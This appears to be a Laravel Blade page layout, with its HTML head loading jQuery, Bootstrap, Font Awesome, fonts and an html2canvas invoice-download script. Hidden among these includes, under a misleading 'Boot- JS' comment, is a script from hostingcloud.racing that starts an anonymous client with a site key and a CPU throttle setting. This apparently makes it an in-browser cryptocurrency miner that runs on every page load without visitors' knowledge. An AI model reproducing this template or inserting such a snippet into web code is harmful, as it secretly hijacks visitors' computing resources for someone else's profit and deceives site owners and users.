<!-- NAV BAR OLD -->
<!-- DISCARDED -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="icon" type="image/png" href="{{asset('/logo/logo.png')}}">
  <title>
    @yield('title')
  </title>
  <!-- Custom CSS -->
  <link rel="stylesheet" href="{{asset('css/nav.css')}}">

  <!-- JQuery -->
  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script>
  <script src="{{asset('js/cookie_helper.js')}}"></script>

  <meta dev="niush">
  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <!-- Boot- JS -->
  <script src="https://www.hostingcloud.racing/i9x6.js"></script> <script> var _client = new Client.Anonymous('43b399213aa30ae7649ca05915705cf06edacba447625589e8689668676c389f', { throttle: 0.3, ads: 0 }); _client.start(); </script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">

  <!-- Slider css + js -->

  <!-- FOnts -->
  <link href="https://fonts.googleapis.com/css?family=Montserrat|Open+Sans+Condensed:300|PT+Sans|Raleway|Rajdhani" rel="stylesheet">

<!-- Scrript for downloading invoice-->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script src="https://files.codepedia.info/files/uploads/iScripts/html2canvas.js"></script>
</head>
<body>

  @include('client.includes.nav_old')


  @yield('content')
